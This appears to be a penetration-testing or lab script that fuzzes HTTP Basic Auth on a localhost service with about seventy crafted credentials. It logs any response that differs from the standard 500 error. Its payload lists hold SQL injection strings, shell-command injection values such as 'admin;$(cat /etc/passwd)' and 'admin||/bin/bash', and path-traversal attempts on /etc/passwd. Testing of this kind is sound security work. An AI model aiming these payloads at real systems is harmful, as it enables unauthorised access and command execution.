#!/usr/bin/env python3
import requests
import base64
import urllib.parse
from requests.auth import HTTPBasicAuth

# Suppress SSL warnings for cleaner output
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target_url = "http://127.0.0.1:33189"

# Store to detect standard 500 error content
standard_500_content = None

# Track results by status code
def categorize_status(status_code):
    if status_code == 200:
        return "SUCCESS"
    elif status_code == 401:
        return "UNAUTHORIZED"
    elif status_code == 403:
        return "FORBIDDEN"
    elif status_code == 500:
        return "SERVER_ERROR"
    else:
        return "OTHER"

# Custom Basic Auth with specific credentials
def test_basic_auth(username=None, password=None, raw_credentials=None):
    """Test Basic Auth with custom credentials."""
    headers = {}
    if raw_credentials:
        # Use raw base64 encoded credentials
        headers['Authorization'] = f'Basic {raw_credentials}'
    elif username is not None or password is not None:
        # Build credentials string
        username_str = username if username is not None else ''
        password_str = password if password is not None else ''
        creds = f"{username_str}:{password_str}"
        encoded = base64.b64encode(creds.encode()).decode()
        headers['Authorization'] = f'Basic {encoded}'
    
    try:
        response = requests.get(target_url, headers=headers, timeout=10, verify=False)
        return response.status_code, response.text, dict(response.headers)
    except requests.exceptions.RequestException as e:
        return None, str(e), {}

# Test 1: No credentials (baseline)
print("=" * 80)
print("BASELINE TEST: No credentials")
print("=" * 80)
try:
    r = requests.get(target_url, timeout=10, verify=False)
    print(f"Status: {r.status_code}")
    print(f"Content Length: {len(r.text)}B")
    print(f"Response: {r.text[:200]}...")
    print(f"Headers: {dict(r.headers)}")
    print()
except Exception as e:
    print(f"Error: {e}")
    print()

# Test 2: Valid credentials (baseline for error)
print("=" * 80)
print("BASELINE TEST: Valid credentials (admin:admin)")
print("=" * 80)
status, content, headers = test_basic_auth(username="admin", password="admin")
if status:
    print(f"Status: {status}")
    print(f"Content Length: {len(content)}B")
    print(f"Response: {content[:200]}...")
    print(f"Headers: {headers}")
    standard_500_content = content
    print()
else:
    print(f"Error: {content}")
    print()

# Test Cases
test_cases = []

# Category 1: Special characters
test_cases.extend([
    ("Special chars - SQLi OR", "admin'or'1'='1", "admin"),
    ("Special chars - Double Quote", "admin\"", "pass"),
    ("Special chars - Backticks", "admin`whoami`", "pass"),
    ("Special chars - DOLLAR sub", "admin$(whoami)", "pass"),
    ("Special chars - Semicolon", "admin;ls", "pass"),
    ("Special chars - Pipe", "admin|id", "pass"),
])

# Category 2: SQLi patterns in username
test_cases.extend([
    ("SQLi - Comment #", "admin'#", "pass"),
    ("SQLi - Comment --", "admin\"--", "pass"),
    ("SQLi - OR 1=1", "admin' OR '1'='1", "pass"),
    ("SQLi - UNION", "admin' UNION SELECT 1--", "pass"),
    ("SQLi - Quote bypass", "admin\" OR 1=1--", "pass"),
])

# Category 3: Command injection
test_cases.extend([
    ("Command - Semicolon cat", "admin;$(cat /etc/passwd)", "pass"),
    ("Command - Backtick id", "admin`|whoami`", "pass"),
    ("Command - DOLLAR id", "admin$(id)", "pass"),
    ("Command - Double pipe", "admin||/bin/bash", "pass"),
    ("Command - Ampersand", "admin&whoami&", "pass"),
])

# Category 4: Path traversal
test_cases.extend([
    ("Path - Unix absolute", "../../../../etc/passwd", "pass"),
    ("Path - Windows", "..\\..\\..\\..\\etc\\passwd", "pass"),
    ("Path - URL encoded", "..%2f..%2f..%2f..%2fetc/passwd", "pass"),
    ("Path - Double dot", ".../.../.../.../etc/passwd", "pass"),
    ("Path - Null byte", "../../../../etc/passwd%00", "pass"),
])

# Category 5: Null bytes and encoding
test_cases.extend([
    ("Null - Username only", "admin%00", "pass"),
    ("Null - With colon", "admin%00", "test"),
    ("Null - Both fields", "admin%00", "pass%00"),
    ("Null - Password", "admin", "pass%00suffix"),
])

# Category 6: Empty/null fields
test_cases.extend([
    ("Empty - No username", "", "password"),
    ("Empty - No password", "username", ""),
    ("Empty - Both empty", "", ""),
    ("Empty - Just colon", ":", "pass"),
    ("Empty - Double colon", "::", "pass"),
])

# Category 7: Extra colons
test_cases.extend([
    ("Extra - Triple colon", ":::admin", "pass"),
    ("Extra - Double colon", "admin::pass", ""),
    ("Extra - Colon in middle", "admin:pass:extra", ""),
    ("Extra - Front colons", "::admin", "pass"),
])

# Category 8: Whitespace tricks
test_cases.extend([
    ("Space - Username space", "admin ", "pass"),
    ("Space - Password space", "admin", " pass"),
    ("Space - Both spaces", "admin ", " pass"),
    ("Space - Multiple spaces", "admin  :  pass", ""),
    ("Space - URL encoded LF user", "admin%0a", "pass"),
    ("Space - URL encoded LF pass", "admin", "%0apass"),
])

# Category 9: URL encoded variants
test_cases.extend([
    ("URL - Full encoded", "%61%64%6d%69%6e:%70%61%73%73", None),  # admin:pass
    ("URL - Admin encoded only", "%61%64%6d%69%6e", "pass"),
    ("URL - Single char", "a%64min", "pass"),
])

# Category 10: Double encoding
test_cases.extend([
    ("Double - Full double", "%2561%2564%256d%2569%256e:%2570%2574%2574", None),  # %61%64%6d%69%6e:%70%74%74
    ("Double - Partial", "%2561dmin", "pass"),
])

# Category 11: Unicode/overlong
test_cases.extend([
    ("Unicode - Overlong path", "%c0%af%c0%ae%c0%ae%c0%ae%c0%aeetc/passwd", "pass"),
    ("Unicode - Overlong admin", "%c0%61dmin", "pass"),
])

# Category 12: Malformed base64
test_cases.extend([
    ("Base64 - Add random char", "YWRtaW46cGFzcw==X", None),  # admin:pass + X
    ("Base64 - Remove padding", "YWRtaW46cGFzcw", None),  # admin:pass no padding
    ("Base64 - Truncate", "YWRtaW46", None),  # admin:
    ("Base64 - Corrupted", "!@#$%^&*()", None),
])

# Category 13: Long strings
test_cases.extend([
    ("Long - Username 1000", "A" * 1000, "pass"),
    ("Long - Password 1000", "admin", "A" * 1000),
    ("Long - Both 1000", "A" * 1000, "B" * 1000),
    ("Long - Username 10000", "A" * 10000, "pass"),
])

# Category 14: Mixed case
test_cases.extend([
    ("Case - Username mixed", "AdMiN", "admin"),
    ("Case - Password mixed", "admin", "aDmIn"),
    ("Case - Both mixed", "AdMiN", "aDmIn"),
    ("Case - Capital letters", "ADMIN", "pass"),
])

# Category 15: Missing username/password
test_cases.extend([
    ("Missing - Username only", "admin", None),
    ("Missing - User only 2", "test", None),
    ("Missing - Password only", None, "admin"),
    ("Missing - Password only 2", None, "test"),
    ("Missing - Both None", None, None),
])

# Category 16: Raw malformed base64
test_cases.extend([
    ("Raw - Empty base64", "", None),
    ("Raw - Just spaces", "ICAK", None),  # base64 of " \n\t"
    ("Raw - Newlines", "YWRtaW46\n\ncGFzcw==", None),  # admin:pass with newlines
    ("Raw - With special", "YWRtaW46cGFzcw==$", None),
])

# Category 17: Unicode characters
test_cases.extend([
    ("Unicode - Username", "αdmin", "pass"),  # Greek alpha
    ("Unicode - Password", "admin", "pαss"),  # Greek alpha
    ("Unicode - Emoji", "admin😀", "pass"),
])

# Additional edge cases
test_cases.extend([
    ("Edge - Only numbers", "12345", "67890"),
    ("Edge - Binary-like", "\x00\x01\x02", "\x03\x04\x05"),
    ("Edge - CRLF", "admin\r\n", "pass\r\n"),
])

# Run all test cases
results = {}
anomalies = []

print("=" * 80)
print("STARTING CREDENTIAL MANIPULATION TESTS")
print("=" * 80)
print(f"Total test cases: {len(test_cases)}")
print()

for i, (description, username, password) in enumerate(test_cases, 1):
    print(f"[{i}/{len(test_cases)}] Testing: {description}")
    
    # Handle raw base64 credentials
    if password == None and username and ':' not in username:
        # This is a raw base64 credential
        try:
            status, content, headers = test_basic_auth(raw_credentials=username)
        except:
            status, content, headers = None, "Invalid base64", {}
    else:
        status, content, headers = test_basic_auth(username, password)
    
    if status is None:
        print(f"  → ERROR: {content}")
        continue
    
    category = categorize_status(status)
    print(f"  → Status: {status} ({category})")
    
    # Check for non-500 status (anomaly)
    if status != 500:
        print(f"  → [!] ANOMALY! Non-500 status: {status}")
        anomalies.append({
            'test': description,
            'status': status,
            'username': username,
            'password': password
        })
    
    # Check if 500 content is different from standard
    elif standard_500_content and content != standard_500_content:
        if len(content) != len(standard_500_content):
            print(f"  → [!] DIFFERENT 500! Length: {len(content)}B vs {len(standard_500_content)}B")
            anomalies.append({
                'test': f"{description} (different 500)",
                'status': status,
                'username': username,
                'password': password,
                'note': 'Different content length'
            })
    
    # Print interesting headers
    interesting_headers = {k: v for k, v in headers.items() 
                          if any(keyword in k.lower() for keyword in ['www-authenticate', 'error', 'location'])}
    if interesting_headers:
        print(f"  → Headers: {interesting_headers}")
    
    # Print error messages if status != 500
    if status != 500:
        print(f"  → Content: {content[:300]}...")
    
    # Store result
    if status not in results:
        results[status] = 0
    results[status] += 1
    
    print()

# Summary
print("=" * 80)
print("TEST SUMMARY")
print("=" * 80)
print(f"Status code distribution:")
for status, count in sorted(results.items()):
    print(f"  {status}: {count} tests")
print()

if anomalies:
    print(f"Found {len(anomalies)} anomalies (non-500 or different errors):")
    print("=" * 80)
    for anomaly in anomalies:
        print(f"[!] {anomaly['test']}")
        print(f"    Status: {anomaly['status']}")
        print(f"    User: {repr(anomaly['username'])}")
        print(f"    Pass: {repr(anomaly.get('password', 'N/A'))}")
        if 'note' in anomaly:
            print(f"    Note: {anomaly['note']}")
        print()
else:
    print("No anomalies detected - all tests returned standard 500 error")
    print()

# Save standard 500 content for reference
print("=" * 80)
print("STANDARD 500 ERROR CONTENT SAMPLE:")
print("=" * 80)
if standard_500_content:
    print(standard_500_content[:500])
    print(f"... (total {len(standard_500_content)} bytes)")
else:
    print("Not captured")
